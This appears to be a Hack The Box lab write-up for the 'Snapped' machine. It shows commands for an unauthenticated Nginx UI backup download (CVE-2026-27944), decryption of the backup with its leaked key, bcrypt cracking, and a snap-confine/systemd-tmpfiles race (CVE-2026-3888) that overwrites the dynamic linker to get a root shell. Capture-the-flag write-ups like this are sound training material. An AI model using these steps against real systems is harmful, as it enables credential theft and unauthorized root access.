---
title: Snapped
date: 2026-04-27
category: [HackTheBox, Linux, Web Exploitation]
tags: [nmap, ffuf]
difficulty: Hard
summary: Snapped is a hard rated box on Hack The Box
---

[Link to machine.](https://app.hackthebox.com/machines/Snapped)

## Reconnaissance
Nmap scan:
```bash
nmap -sVC -vv -p- <IP> -T4 -oN nmap-full
```
![](../Images/Pasted%20image%2020260427141854.png)
Vhost fuzzing:
```bash
ffuf -u http://snapped.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```
Found a vhost with status code 200:
![](../Images/Pasted%20image%2020260425224808.png)
![](../Images/Pasted%20image%2020260425224732.png)
Got launched in a login page, tried fuzzing some default creds but none's working.
This is running a Nginx UI instance and I saw it's open source, so I can take a peek on Nginx UI public repository. Since I'm having no valid creds so I can try to find some submitted security problem related to Unauthenticated user.
## [CVE-2026-27944](https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-g9w5-qffc-6762)
So this vulnerability is affecting Nginx UI version <= 2.3.2, and fixed in 2.3.3.
Where the API endpoint `/api/backup` is open in public without authentication checks, allowing everyone to download full system backup containing sensitive user's data. Although these data is encrypted in AES-256-CBC, the key and IV is returned in the response's `X-Backup-Security` header.
## Exploitation
We curl with `-v` to also dump the response header for the key
```bash
curl -v http://admin.snapped.htb/api/backup --output backup.zip
```
![](../Images/Pasted%20image%2020260427143005.png)
Unzipping `backup.zip` we got 3 encrypted files:
![](../Images/Pasted%20image%2020260427143143.png)
Decoding and determining the length of key and IV:
![](../Images/Pasted%20image%2020260427143436.png)
![](../Images/Pasted%20image%2020260427143526.png)
I got a 32 bytes key and 16 bytes IV.
We can use OpenSSL to decode:
```bash
IV=$(echo '8KLqXKpzTRqRn4DscZrjBA==' | base64 -d | xxd -p | tr -d '\n')
KEY=$(echo 'uqxJQY/q03Yb6bqkACsePDBCoTZ0JThyIaIUAlc9N98=' | base64 -d | xxd -p | tr -d '\n') 
openssl enc -d -aes-256-cbc -K "$KEY" -iv "$IV" -in nginx-ui.zip -out nginx-ui.dec.zip
```
![](../Images/Pasted%20image%2020260427144258.png)
Targetting the `nginx-ui.zip` because it is said to store user creds inside.
We can interact with this db using `sqlite3`:
![](../Images/Pasted%20image%2020260426000153.png)
![](../Images/Pasted%20image%2020260426000351.png)
![](../Images/Pasted%20image%2020260426000520.png)
We got some username and hashes stored here.
Based on the public repo `nginx-ui/internal/login`:
![](../Images/Pasted%20image%2020260426094318.png)
The password is just pure bcrypt, we can crack it with hashcat.
```bash
hashcat hashes.txt /usr/share/wordlists/rockyou.txt -m 3200
```
![](../Images/Pasted%20image%2020260427144926.png)
We cracked the password of `jonathan`, the other admin's password we gonna leave it there.
Try ssh as jonathan:
![](../Images/Pasted%20image%2020260426094932.png)
## Privilege Escalation
```bash
sudo -l
```
![](../Images/Pasted%20image%2020260427145238.png)
Checking SUID binaries
```bash
find / -perm -u=s -type f -exec ls -la {} \; 2>/dev/null
```
![](../Images/Pasted%20image%2020260427145413.png)
I see a `snap-confine` having SUID bit set, and since the machine named Snapped, it suggests I should take a look about it.
So I go searching online for any snap related vulnerability, and found a LPE exploits using `snap-confine`.
## [CVE-2026-3888]([https://blog.qualys.com/vulnerabilities-threat-research/2026/03/17/cve-2026-3888-important-snap-flaw-enables-local-privilege-escalation-to-root](https://cdn2.qualys.com/advisory/2026/03/17/snap-confine-systemd-tmpfiles.txt))
CVE-2026-3888 is a vulnerability affecting the default installation of Ubuntu Desktop >= 24.04. It was discovered and disclosed by Qualys.
The exploitation process involves two normal components of a typical Ubuntu machine: `snap-confine` and `systemd-tmpfiles`.
- `snap-confine`: is a SUID-root binary that handles the initialization of a sandbox environment for a snap app to run including bind-mounting file systems, or manage Apparmor profiles.
- `systemd-tmpfiles`: perform delete/create and cleanup files and directories as root following the configuration file format specified in `tmpfiles.d`
### snap-confine's behavior
- To set up a snap's sandbox, snap-confine will create a directory named `/tmp/snap-private-tmp/$SNAP/tmp` (as root, perm 01777) which will later be bind-mounted onto snap sandbox's `/tmp` directory.
- Inside snap namespace, it will create a directory named `/tmp/.snap` (`/tmp/snap-private-tmp/$SNAP/tmp/.snap` in host namespace) (as root, perm 0755) for "mimics", or reuses if it's already exists.
### Mimics (`/tmp/.snap`) usage
For example, inside each or every snap, snap-confine needs to bind-mount the host's `/usr/lib/x86_64-linux-gnu/webkit2gtk-4.0` directory to a mount point (`/usr/lib/x86_64-linux-gnu/webkit2gtk-4.0` inside the sandbox).
The problem is, the mount point `/usr/lib/x86_64-linux-gnu/webkit2gtk-4.0` inside the sandbox isn't created normally, and snap is a read-only file system -> This needs some workaround mechanism as solution.
This is where `/tmp/.snap` is used:
```
1/ Inside the sandbox, mount the read-only directory /usr/lib/x86_64-linux-gnu onto /tmp/.snap/usr/lib/x86_64-linux-gnu to preserve files/directories inside.
2/ Bind-mount a writable tmpfs onto snap's /usr/lib/x86_64-linux-gnu, it is now writable, but its content got shadowed by the mount directory but can still be accessed through /tmp/.snap/x86_64-linux-gnu.
3/ Bind-mount files/directories inside /tmp/.snap/x86_64-linux-gnu back to the original /usr/lib/x86_64-linux-gnu.
4/ Since /usr/lib/x86_64-linux-gnu is now writable, we can create the desired mount point for webkit2gtk-4.0
```
From this behavior, if the attacker somehow get control over the content inside `/tmp/.snap/usr/lib/x86_64-linux-gnu`, they will have control over the shared library namespace including the dynamic linker `ld-linux-x86-64.so.2`.
But since the `/tmp/.snap` is root owned (0755), a normal user cannot modify its content. But the `/tmp` itself is world-writable, so the attacker may need some mechanism to get rid of the root-owned `/tmp/.snap` created by snap-confine to replace with their own `/tmp/.snap`. 
This is where `systemd-tmpfiles` come to use, since its job include deleting old files that is not accessed or modify recently, so we can abuse it to delete the stale root-owned `/tmp/.snap` and recreate our own `/tmp/.snap`.
To ensure the winning in the race condition, we can slowdown the execution speed of `snap-confine`, by running snap with `SNAPD_DEBUG = 1` which make `snap-confine` output to `stderr` for every operation it perform using `write` syscall. Critically, this debug feature performs synchronously, and the `write` syscall blocks the thread until it finish writing. Therefore we can make it block on every single byte written, by redirecting the `stderr` to write to a minimized-buffer socket.
## Prerequisite check 
Checking snap version:
![](../Images/Pasted%20image%2020260426104917.png)
We can find the configuration for `tmp` directory at `/usr/lib/tmpfiles.d/tmp.conf`:
![](../Images/Pasted%20image%2020260426112328.png)
The age field is 4 mins, which means a file will be considered eligible for clean up if not access/modified within 4 mins.
Next we check for systemd-tmpfiles clean timer:
```bash
systemctl cat systemd-tmpfiles-clean.timer
```
![](../Images/Pasted%20image%2020260426134733.png)
This systemd-tmpfiles-clean timer showing the systemd-tmpfiles clean service is overridden to perform 1 minute after boot and is invoked every minute. This could be the setup for this machine so that I don't have to wait for a long time til the tmpfiles cleanup job starts.
## Exploitation
### Setting up and enter snap sandbox for `firefox`
```bash
env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /bin/bash
```
Check the existence of `/tmp/.snap`:
```bash
stat ./.snap
```
Get current shell's PID (for outside session):
```bash
echo $$
```
Perform a loop that keeps `/tmp` alive by touching it and check for existence of `/tmp/.snap`:
```bash
while test -d ./.snap; do touch ./; sleep 60; done
```
![](../Images/Pasted%20image%2020260426233935.png)
We wait until the loop exits, it means the cleanup has done the job.
![](../Images/Pasted%20image%2020260426234439.png)
### Winning the race
From the snap's shell PID, we can bypass the permission to navigate to its `/tmp/snap-private-tmp/$SNAP/tmp` folder by:
```bash
cd /proc/3290/cwd
```
Destroy the snap's sandbox but preserving the `/tmp`: since snap uses a cached mount namespaces and reuses them for subsequent snap launches without rebuilding. We destroy it by invoking `snap-confine` with invalid base (`snapd`), forcing it to perform a fresh build and redo the mimic sequence:
```bash
env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base snapd snap.firefox.hook.configure /nonexistent
```
Starts the helper binary and racing:
```bash
~/firefox_2404 ~/librootshell.so
```
Basically `firefox_2404` will help us create a copy of `/tmp/.snap` (I owned it of course) and replace the deleted root-owned `/tmp/.snap`.
The `librootshell.so` is basically a linker that spawns a privileged shell by doing
```c
setreuid(0,0)
setregid(0,0)
execve("/tmp/sh", ...)
```
![](../Images/Pasted%20image%2020260427110242.png)
Access the namespace file system and verify the dynamic linker:
![](../Images/Pasted%20image%2020260427110445.png)
We plant the busybox and overwrite the dynamic linker with our librootshell:
```bash
cp /usr/bin/busybox ./tmp/sh
cat ~/librootshell.so > ./usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
```
![](../Images/Pasted%20image%2020260427110537.png)
Execute a SUID binary in our poisoned namespace to get our root shell:
```bash
env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine \
 --base core22 snap.firefox.hook.configure /usr/lib/snapd/snap-confine
```
![](../Images/Pasted%20image%2020260427110828.png)
Escaping AppArmor's confinement:
Although we got a root shell, we are still under strict confinement of the namespace's AppArmor profile.
But AppArmor explicitly permits writes to `/var/snap/<snap-name>/common`, so I copy the SUID-root bash there:
![](../Images/Pasted%20image%2020260427110936.png)![](../Images/Pasted%20image%2020260427111317.png)
